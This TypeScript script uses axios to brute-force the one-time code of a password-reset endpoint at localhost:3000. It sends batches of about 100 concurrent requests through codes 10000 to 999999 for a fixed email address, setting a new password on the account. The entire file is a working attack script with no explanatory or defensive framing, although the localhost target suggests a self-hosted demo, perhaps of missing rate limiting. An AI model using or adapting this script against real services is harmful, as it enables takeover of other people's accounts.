import axios from "axios";

async function sendRequest(otp:string) {
	let data = JSON.stringify({
		email: "abhiraj@gmail.com",
		otp,
		newPassword: "abhi",
	});

	let config = {
		method: "post",
		maxBodyLength: Infinity,
		url: "http://localhost:3000/reset-password",
		headers: {
			"Content-Type": "application/json",
		},
		data: data,
	};
    try {
        await axios.request(config);
    } catch(e) {
        // console.log("wrong");
    }
}

async function sendBatchReq() {
    for(let i = 10000; i <= 999999; i+=100) {
        
        const p = [];

        console.log(i);
        for(let j = 0; j <= 100; j++) {
            p.push(sendRequest((i + j).toString()));
        }
        await Promise.all(p);
    }
}

sendBatchReq();